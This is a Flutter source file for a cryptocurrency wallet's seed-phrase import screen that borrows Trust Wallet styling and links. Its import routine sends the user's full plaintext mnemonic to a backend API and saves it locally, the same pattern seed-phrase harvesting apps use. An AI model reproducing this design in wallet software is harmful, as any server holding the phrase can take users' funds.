import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:bip39/bip39.dart' as bip39;
import '../../constants/app_colors.dart';
import '../../utils/theme_helper.dart';
import '../../services/api_service.dart';
import '../../services/wallet_storage.dart';
import '../../services/passcode_storage.dart';
import '../auth/wallet_ready_screen.dart';
import '../scan/scan_qr_screen.dart';

class EnterMnemonicScreen extends StatefulWidget {
  final String? selectedNetwork;

  const EnterMnemonicScreen({
    super.key,
    this.selectedNetwork,
  });

  @override
  State<EnterMnemonicScreen> createState() => _EnterMnemonicScreenState();
}

class _EnterMnemonicScreenState extends State<EnterMnemonicScreen> {
  final TextEditingController _walletNameController = TextEditingController();
  final TextEditingController _mnemonicController = TextEditingController();
  final FocusNode _walletNameFocusNode = FocusNode();
  final FocusNode _mnemonicFocusNode = FocusNode();
  bool _isLoading = false;
  String? _errorMessage;

  @override
  void initState() {
    super.initState();
    _generateWalletName();
    _walletNameController.addListener(() {
      setState(() {});
    });
    _mnemonicController.addListener(() {
      setState(() {});
    });
    _walletNameFocusNode.addListener(() {
      setState(() {});
    });
    _mnemonicFocusNode.addListener(() {
      setState(() {});
    });
  }

  Future<void> _generateWalletName() async {
    try {
      final devicePassCodeId = await WalletStorage.getDevicePassCodeId();
      if (devicePassCodeId != null && devicePassCodeId.isNotEmpty) {
        final walletsResponse = await ApiService.getWalletsByDevice(devicePassCodeId);
        if (walletsResponse['success'] == true && walletsResponse['data'] != null) {
          final wallets = walletsResponse['data'] as List;
          final walletNumber = wallets.length + 1;
          _walletNameController.text = 'Main Wallet $walletNumber';
        } else {
          _walletNameController.text = 'Main Wallet 1';
        }
      } else {
        _walletNameController.text = 'Main Wallet 1';
      }
    } catch (e) {
      // Default to Main Wallet 1 if there's an error
      _walletNameController.text = 'Main Wallet 1';
    }
  }

  @override
  void dispose() {
    _walletNameController.dispose();
    _mnemonicController.dispose();
    _walletNameFocusNode.dispose();
    _mnemonicFocusNode.dispose();
    super.dispose();
  }

  Future<void> _importWallet() async {
    final mnemonic = _mnemonicController.text.trim();
    
    if (mnemonic.isEmpty) {
      setState(() {
        _errorMessage = 'Please enter your secret phrase';
      });
      return;
    }

    // Validate mnemonic format
    if (!bip39.validateMnemonic(mnemonic)) {
      setState(() {
        _errorMessage = 'Invalid secret phrase. Please check and try again.';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = null;
    });

    try {
      // Get or create device passcode ID
      String? devicePassCodeId = await WalletStorage.getDevicePassCodeId();

      if (devicePassCodeId == null || devicePassCodeId.isEmpty) {
        // Get the saved passcode
        String? passcode = await PasscodeStorage.getPasscode();
        
        if (passcode == null || passcode.isEmpty) {
          throw Exception('Passcode not found. Please set up a passcode first.');
        }

        // Generate a unique device name
        final deviceName = 'Mobile_${DateTime.now().millisecondsSinceEpoch}';

        // Create device passcode on backend
        final deviceResponse = await ApiService.createDevicePasscode(
          name: deviceName,
          passcode: passcode,
        );

        if (!deviceResponse['success'] || deviceResponse['data'] == null) {
          throw Exception('Failed to create device passcode');
        }

        devicePassCodeId = deviceResponse['data']['serverPasscodeId'] as String;
        
        // Save device passcode ID locally
        await WalletStorage.saveDevicePassCodeId(devicePassCodeId);
      }

      // Import wallet via backend
      final walletName = _walletNameController.text.trim().isEmpty 
          ? 'Imported Wallet' 
          : _walletNameController.text.trim();
      
      final walletResponse = await ApiService.createWallet(
        devicePassCodeId: devicePassCodeId,
        walletName: walletName,
        mnemonic: mnemonic,
        isMain: false,
      );

      if (!walletResponse['success'] || walletResponse['data'] == null) {
        throw Exception('Failed to import wallet');
      }

      final walletId = walletResponse['data']['walletId'] as String;
      final savedWalletName = walletResponse['data']['walletName'] as String? ?? walletName;

      // Save wallet info locally
      await WalletStorage.saveWalletId(walletId);
      await WalletStorage.saveWalletName(savedWalletName);
      await WalletStorage.saveMnemonic(mnemonic);

      // Navigate to wallet ready screen
      if (!mounted) return;
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(
          builder: (context) => const WalletReadyScreen(),
        ),
      );
    } catch (e) {
      setState(() {
        _isLoading = false;
        _errorMessage = e.toString().replaceAll('Exception: ', '');
      });
    }
  }

  void _pasteMnemonic() async {
    final clipboardData = await Clipboard.getData(Clipboard.kTextPlain);
    if (clipboardData?.text != null) {
      setState(() {
        _mnemonicController.text = clipboardData!.text!;
        _errorMessage = null;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    final backgroundColor = ThemeHelper.getBackgroundColor(context);
    final textColor = ThemeHelper.getTextColor(context);
    final secondaryTextColor = ThemeHelper.getSecondaryTextColor(context);
    final grayColor = ThemeHelper.getGrayColor(context);
    final primaryColor = ThemeHelper.getPrimaryColor(context);

    // Determine title based on selected network
    final title = widget.selectedNetwork ?? 'Multi-coin wallet';

    return Scaffold(
      backgroundColor: backgroundColor,
      appBar: AppBar(
        backgroundColor: backgroundColor,
        elevation: 0,
        leading: IconButton(
          icon: Icon(
            Icons.arrow_back,
            color: textColor,
          ),
          onPressed: () => Navigator.pop(context),
        ),
        title: Text(
          title,
          style: TextStyle(
            fontSize: 18,
            fontWeight: FontWeight.w600,
            color: textColor,
          ),
        ),
        centerTitle: true,
        actions: [
          IconButton(
            icon: Icon(
              Icons.qr_code_scanner,
              color: textColor,
            ),
            onPressed: () {
              Navigator.push(
                context,
                MaterialPageRoute(
                  builder: (context) => const ScanQrScreen(),
                ),
              );
            },
          ),
        ],
      ),
      body: SafeArea(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(20),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              const SizedBox(height: 8),
              // Wallet name section
              Text(
                'Wallet name',
                style: TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w500,
                  color: secondaryTextColor,
                ),
              ),
              const SizedBox(height: 8),
              TextField(
                controller: _walletNameController,
                focusNode: _walletNameFocusNode,
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                  color: textColor,
                ),
                decoration: InputDecoration(
                  hintText: 'Wallet name',
                  hintStyle: TextStyle(
                    color: secondaryTextColor,
                  ),
                  filled: false,
                  border: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: BorderSide(
                      color: grayColor,
                      width: 1,
                    ),
                  ),
                  enabledBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: BorderSide(
                      color: grayColor,
                      width: 1,
                    ),
                  ),
                  focusedBorder: OutlineInputBorder(
                    borderRadius: BorderRadius.circular(12),
                    borderSide: BorderSide(
                      color: primaryColor,
                      width: 1,
                    ),
                  ),
                  contentPadding: const EdgeInsets.symmetric(
                    horizontal: 16,
                    vertical: 12,
                  ),
                  suffixIcon: ValueListenableBuilder<TextEditingValue>(
                    valueListenable: _walletNameController,
                    builder: (context, value, child) {
                      return value.text.isNotEmpty
                          ? IconButton(
                              icon: Container(
                                width: 20,
                                height: 20,
                                decoration: BoxDecoration(
                                  color: secondaryTextColor,
                                  shape: BoxShape.circle,
                                ),
                                child: const Icon(
                                  Icons.close,
                                  color: Colors.white,
                                  size: 12,
                                ),
                              ),
                              onPressed: () {
                                _walletNameController.clear();
                              },
                            )
                          : const SizedBox.shrink();
                    },
                  ),
                ),
              ),
              const SizedBox(height: 24),
              // Secret phrase section
              Text(
                'Secret phrase',
                style: TextStyle(
                  fontSize: 14,
                  fontWeight: FontWeight.w500,
                  color: secondaryTextColor,
                ),
              ),
              const SizedBox(height: 8),
              Container(
                decoration: BoxDecoration(
                  color: backgroundColor,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: _mnemonicFocusNode.hasFocus
                        ? primaryColor
                        : grayColor,
                    width: 1,
                  ),
                ),
                child: Stack(
                  children: [
                    ValueListenableBuilder<TextEditingValue>(
                      valueListenable: _mnemonicController,
                      builder: (context, value, child) {
                        return TextField(
                          controller: _mnemonicController,
                          focusNode: _mnemonicFocusNode,
                          maxLines: 6,
                          style: TextStyle(
                            color: textColor,
                            fontSize: 16,
                          ),
                          decoration: InputDecoration(
                            hintText: '',
                            border: InputBorder.none,
                            contentPadding: EdgeInsets.only(
                              left: 16,
                              top: 16,
                              right: value.text.isNotEmpty ? 48 : 16,
                              bottom: 48,
                            ),
                          ),
                          onChanged: (_) {
                            setState(() {
                              _errorMessage = null;
                            });
                          },
                        );
                      },
                    ),
                    // Clear button (X icon)
                    ValueListenableBuilder<TextEditingValue>(
                      valueListenable: _mnemonicController,
                      builder: (context, value, child) {
                        return value.text.isNotEmpty
                            ? Positioned(
                                top: 8,
                                right: 8,
                                child: IconButton(
                                  icon: Container(
                                    width: 20,
                                    height: 20,
                                    decoration: BoxDecoration(
                                      color: secondaryTextColor,
                                      shape: BoxShape.circle,
                                    ),
                                    child: const Icon(
                                      Icons.close,
                                      color: Colors.white,
                                      size: 12,
                                    ),
                                  ),
                                  onPressed: () {
                                    setState(() {
                                      _mnemonicController.clear();
                                      _errorMessage = null;
                                    });
                                  },
                                  padding: EdgeInsets.zero,
                                  constraints: const BoxConstraints(),
                                ),
                              )
                            : const SizedBox.shrink();
                      },
                    ),
                    // Paste button
                    Positioned(
                      bottom: 8,
                      right: 8,
                      child: TextButton(
                        onPressed: _pasteMnemonic,
                        style: TextButton.styleFrom(
                          padding: const EdgeInsets.symmetric(
                            horizontal: 12,
                            vertical: 4,
                          ),
                          minimumSize: Size.zero,
                          tapTargetSize: MaterialTapTargetSize.shrinkWrap,
                        ),
                        child: Text(
                          'Paste',
                          style: TextStyle(
                            color: primaryColor,
                            fontSize: 14,
                            fontWeight: FontWeight.w500,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
              const SizedBox(height: 8),
              // Hint text
              Text(
                'Typically 12 (sometimes 18, 24) words separated by single spaces.',
                style: TextStyle(
                  fontSize: 12,
                  color: secondaryTextColor,
                ),
              ),
              if (_errorMessage != null) ...[
                const SizedBox(height: 12),
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: Colors.red.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        Icons.error_outline,
                        color: Colors.red,
                        size: 20,
                      ),
                      const SizedBox(width: 8),
                      Expanded(
                        child: Text(
                          _errorMessage!,
                          style: TextStyle(
                            color: Colors.red,
                            fontSize: 14,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ],
              const SizedBox(height: 32),
              // Restore wallet button
              SizedBox(
                width: double.infinity,
                child: ElevatedButton(
                  onPressed: (_isLoading || _mnemonicController.text.trim().isEmpty)
                      ? null
                      : _importWallet,
                  style: ElevatedButton.styleFrom(
                    backgroundColor: primaryColor,
                    foregroundColor: Colors.white,
                    padding: const EdgeInsets.symmetric(vertical: 16),
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(999), // Full rounded
                    ),
                    elevation: 0,
                    disabledBackgroundColor: AppColors.secondaryBlue,
                    disabledForegroundColor: Colors.white.withOpacity(0.6),
                  ),
                  child: _isLoading
                      ? const SizedBox(
                          height: 20,
                          width: 20,
                          child: CircularProgressIndicator(
                            strokeWidth: 2,
                            valueColor: AlwaysStoppedAnimation<Color>(Colors.white),
                          ),
                        )
                      : const Text(
                          'Restore wallet',
                          style: TextStyle(
                            fontSize: 16,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                ),
              ),
              const SizedBox(height: 16),
              // Help link
              Center(
                child: TextButton(
                  onPressed: () async {
                    final url = Uri.parse(
                      'https://community.trustwallet.com/t/how-to-restore-a-multi-coin-wallet',
                    );
                    if (await canLaunchUrl(url)) {
                      await launchUrl(url, mode: LaunchMode.externalApplication);
                    }
                  },
                  child: Text(
                    'What is a secret phrase?',
                    style: TextStyle(
                      color: primaryColor,
                      fontSize: 14,
                      fontWeight: FontWeight.w500,
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
